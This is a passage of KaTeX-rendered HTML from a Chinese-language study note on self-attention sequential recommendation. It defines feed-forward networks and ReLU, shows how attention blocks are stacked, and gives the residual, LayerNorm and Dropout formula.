stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mtext>和</mtext><msup><mi>b</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup></mrow><annotation encoding=\"application/x-tex\">b^{(1)}和b^{(2)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">和</span><span class=\"mord\"><span class=\"mord mathnormal\">b</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span></span> 是 d 维向量。并且<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>S</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 之间没有交互</p>\n<h4 id=\"ffn前馈神经网络\"><a class=\"anchor\" href=\"#ffn前馈神经网络\">#</a> FFN（前馈神经网络）</h4>\n<p>FFN（Feed-Forward Neural Network，前馈神经网络）是神经网络的一种基本结构，通常用于对输入数据进行非线性变换。它由一个或多个全连接层（也称为密集层）组成，每个层都包含一组可学习的权重和偏置。</p>\n<h4 id=\"relu线性修正单元\"><a class=\"anchor\" href=\"#relu线性修正单元\">#</a> ReLU（线性修正单元）</h4>\n<p>ReLU（Rectified Linear Unit，线性修正单元）是一种常用的激活函数。它的定义如下：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mrow><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">U</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>max</mi><mo>⁡</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mo separator=\"true\">,</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\mathrm{ReLU}(x)=\\max(0,x)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">U</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mop\">max</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>ReLU 的作用是：</p>\n<ol>\n<li>对于输入的每个元素，如果该元素小于 0，则输出 0。</li>\n<li>如果该元素大于等于 0，则输出该元素本身。</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"堆叠自注意力块\"><a class=\"anchor\" href=\"#堆叠自注意力块\">#</a> 堆叠自注意力块</h3>\n<ul>\n<li>\n<p><strong>问题描述</strong>：在第一个自注意力快后<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>F</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">F_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 本质上就聚合了所有之前项目的嵌入，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>(即</mtext><msub><mover accent=\"true\"><mi>E</mi><mo>^</mo></mover><mi>j</mi></msub><mo separator=\"true\">,</mo><mi>j</mi><mo>≤</mo><mi>i</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">\\text{(即}\\hat{E}_{j},j\\leq i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.232878em;vertical-align:-0.286108em;\"></span><span class=\"mord text\"><span class=\"mord\">(</span><span class=\"mord cjk_fallback\">即</span></span><span class=\"mord\"><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9467699999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span><span style=\"top:-3.25233em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.16666em;\"><span class=\"mord\">^</span></span></span></span></span></span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≤</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">)</span></span></span></span>, 但是我们可以以基于 F 的另一个自注意力块来学习更复杂的项目转换。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi mathvariant=\"bold\">S</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msup><mo>=</mo><mrow><mi mathvariant=\"bold\">S</mi><mi mathvariant=\"bold\">A</mi></mrow><mo stretchy=\"false\">(</mo><msup><mi mathvariant=\"bold\">F</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo>−</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo stretchy=\"false\">)</mo><mo>=</mo><mtext>softmax</mtext><mrow><mo fence=\"true\">(</mo><mfrac><mrow><mi mathvariant=\"bold\">Q</mi><msup><mi mathvariant=\"bold\">K</mi><mi>T</mi></msup></mrow><msqrt><mi>d</mi></msqrt></mfrac><mo fence=\"true\">)</mo></mrow><mi mathvariant=\"bold\">V</mi><mo separator=\"true\">,</mo><mspace linebreak=\"newline\"></mspace><msubsup><mi mathvariant=\"bold\">F</mi><mi>i</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup><mo>=</mo><mrow><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">N</mi></mrow><mo stretchy=\"false\">(</mo><msubsup><mi mathvariant=\"bold\">S</mi><mi>i</mi><mrow><mo stretchy=\"false\">(</mo><mi>b</mi><mo stretchy=\"false\">)</mo></mrow></msubsup><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo><mspace width=\"1em\"/><mi mathvariant=\"normal\">∀</mi><mi>i</mi><mo>∈</mo><mo stretchy=\"false\">{</mo><mn>1</mn><mo separator=\"true\">,</mo><mn>2</mn><mo separator=\"true\">,</mo><mo>…</mo><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">}</mo><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbf{S}^{(b)}=\\mathbf{SA}(\\mathbf{F}^{(b-1)})=\\text{softmax}\\left(\\frac{\\mathbf{Q}\\mathbf{K}^T}{\\sqrt{d}}\\right)\\mathbf{V},\\\\\\mathbf{F}_{i}^{(b)}=\\mathrm{FFN}(\\mathbf{S}_{i}^{(b)}),\\quad\\forall i\\in\\{1,2,\\ldots,n\\},\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.938em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.188em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">S</span><span class=\"mord mathbf\">A</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.468361em;vertical-align:-0.95003em;\"></span><span class=\"mord text\"><span class=\"mord\">softmax</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.5183309999999999em;\"><span style=\"top:-2.17778em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93222em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord mathnormal\">d</span></span></span><span style=\"top:-2.89222em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.10777999999999999em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">Q</span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">K</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">)</span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">V</span></span><span class=\"mpunct\">,</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:1.321664em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.4231360000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.2198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.321664em;vertical-align:-0.276864em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">N</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0448em;\"><span style=\"top:-2.4231360000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span style=\"top:-3.2198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">b</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.276864em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:1em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∀</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">{</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">}</span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<p>其中第一块定义为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>S</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>=</mo><mi>S</mi><mtext> </mtext><mi>a</mi><mi>n</mi><mi>d</mi><mtext> </mtext><msup><mi>F</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>=</mo><mi>F</mi></mrow><annotation encoding=\"application/x-tex\">S^{(1)}=S \\ and \\ F^{(1)}=F</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\"> </span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\"> </span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span></span></span></span></p>\n</li>\n<li>\n<p>随着模型深入出现了一些问题，采取的措施为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msup><mi>g</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>x</mi><mo>+</mo><mtext>Dropout</mtext><mo stretchy=\"false\">(</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mtext>LayerNorm</mtext><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">g&#x27;(x)=x+\\text{Dropout}(g(\\text{LayerNorm}(x)))\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.051892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord text\"><span class=\"mord\">Dropout</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord text\"><span class=\"mord\">LayerNorm</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left right left right\" columnspacing=\"0em 1em 0em 1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mn>1.</mn><mtext> 输入 </mtext><mi>x</mi><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo separator=\"true\">⋅</mo><mi>x</mi><mtext>是上一层的输出或者当前层的输入。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>2. 层归一化(Layer Normalization):</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>∙</mo><mtext> 首先对输入 </mtext><mi>x</mi><mtext> 进行层归一化:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mfrac><mrow><mi>x</mi><mo>−</mo><mi>μ</mi></mrow><msqrt><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>+</mo><mi>ϵ</mi></mrow></msqrt></mfrac><mo>⋅</mo><mi>γ</mi><mo>+</mo><mi>β</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>缩放和偏移参数。</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>3. 应用函数 </mtext><mi>g</mi><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo separator=\"true\">⋅</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>注意力机制</mtext><mo stretchy=\"false\">(</mo><mi>S</mi><mi>A</mi><mo stretchy=\"false\">)</mo><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" 